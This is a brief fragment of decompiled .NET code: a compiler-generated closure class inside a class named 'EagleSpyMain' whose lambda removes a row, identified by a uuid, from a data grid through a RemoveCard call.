	internal sealed class _Closure_0024__56_002D0
	{
		// Token: 0x060004D7 RID: 1239 RVA: 0x00079244 File Offset: 0x00077444
		public _Closure_0024__56_002D0(EagleSpyMain._Closure_0024__56_002D0 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_row = arg0._0024VB_0024Local_row;
				this._0024VB_0024Local_uuid = arg0._0024VB_0024Local_uuid;
			}
		}

		// Token: 0x060004D8 RID: 1240 RVA: 0x00002B17 File Offset: 0x00000D17
		internal void _Lambda_0024__0()
		{
			this._0024VB_0024Me.RemoveCard(this._0024VB_0024Local_row, this._0024VB_0024Local_uuid);
		}

		// Token: 0x0400064D RID: 1613
		public DataGridViewRow _0024VB_0024Local_row;

		// Token: 0x0400064E RID: 1614
		public string _0024VB_0024Local_uuid;

		// Token: 0x0400064F RID: 1615
		public EagleSpyMain _0024VB_0024Me;
	}
}
